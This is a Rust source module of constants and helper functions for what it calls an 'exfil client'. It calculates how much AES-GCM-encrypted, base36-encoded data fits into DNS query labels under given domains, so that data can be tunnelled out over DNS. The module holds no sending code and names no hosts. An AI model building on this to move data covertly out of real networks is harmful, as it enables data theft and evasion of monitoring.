//! Shared DNS framing limits and helpers for the exfil client.

pub const DNS_MAX_NAME: usize = 253;
pub const LABEL_CAP: usize = 62;
pub const FRAME_LABELS: usize = 2;
pub const AES_GCM_OVERHEAD: usize = 28;
const LOG36_OF_2: f64 = 0.193_426_403_617_270_83;
const MAX_CHUNK_PROBE: usize = 512;

/// Maximum number of base36 characters available for payload data inside a single label.
pub fn chunk_payload_budget_chars() -> usize {
    LABEL_CAP
}

/// Estimate the number of base36 characters necessary to encode `bytes`.
pub fn estimate_base36_len(bytes: usize) -> usize {
    if bytes == 0 {
        return 1;
    }
    let bits = (bytes * 8) as f64;
    (bits * LOG36_OF_2).ceil() as usize
}

/// Calculate the encoded length for a plaintext payload after AES-GCM wrapping + base36.
pub fn encoded_len_for_payload(plaintext_len: usize) -> usize {
    let cipher_len = plaintext_len + AES_GCM_OVERHEAD;
    estimate_base36_len(cipher_len)
}

/// Returns true if `chunk_bytes` will fit inside the DNS payload budget.
pub fn chunk_fits_budget(chunk_bytes: usize, payload_budget: usize) -> bool {
    encoded_len_for_payload(chunk_bytes) <= payload_budget
}

fn longest_domain_length(domains: &[&str]) -> usize {
    domains
        .iter()
        .map(|d| d.trim().trim_end_matches('.').len())
        .max()
        .unwrap_or(0)
}

/// Compute the largest safe chunk size (in plaintext bytes) for the provided domains.
pub fn max_supported_chunk_bytes(domains: &[&str]) -> usize {
    if !domains_fit_limits(domains) {
        return 0;
    }

    let payload_budget = chunk_payload_budget_chars();
    let mut best = 0usize;
    for chunk in 1..=MAX_CHUNK_PROBE {
        if chunk_fits_budget(chunk, payload_budget) {
            best = chunk;
        } else {
            break;
        }
    }
    best
}

fn domains_fit_limits(domains: &[&str]) -> bool {
    let longest = longest_domain_length(domains);
    if longest == 0 {
        return true;
    }

    // metadata label + data label + two dots + domain must be <= DNS max length.
    let required = LABEL_CAP * FRAME_LABELS + 2 + longest;
    required < DNS_MAX_NAME
}
